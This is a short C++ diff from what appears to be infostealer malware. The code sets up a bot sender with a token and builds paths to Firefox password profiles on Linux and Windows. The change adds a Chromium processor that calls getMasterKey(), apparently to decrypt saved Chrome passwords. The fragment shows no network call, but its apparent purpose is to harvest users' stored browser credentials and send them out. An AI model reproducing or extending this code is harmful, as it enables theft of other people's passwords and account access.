@@ -10,11 +10,8 @@ int main()
         Sender bot_sender(TOKEN);
 
 #if defined(__linux__)
-        string chrome_pass_path="~/.config/google-chrome/Default";
         string firefox_pass_path="~/.mozilla/firefox/<profilename>";
 #elif defined(__WIN64__)
-
-
         TCHAR username[255];
         DWORD username_len=255;
         GetUserName((TCHAR*)username, &username_len);
@@ -22,6 +19,9 @@ int main()
         firefox_pass_path += username;
         firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
 #endif
+        ChromiumProcessor cProc1;
+
+        cProc1.getMasterKey();
 /*
         if(experimental::filesystem::exists(firefox_pass_path))
         {
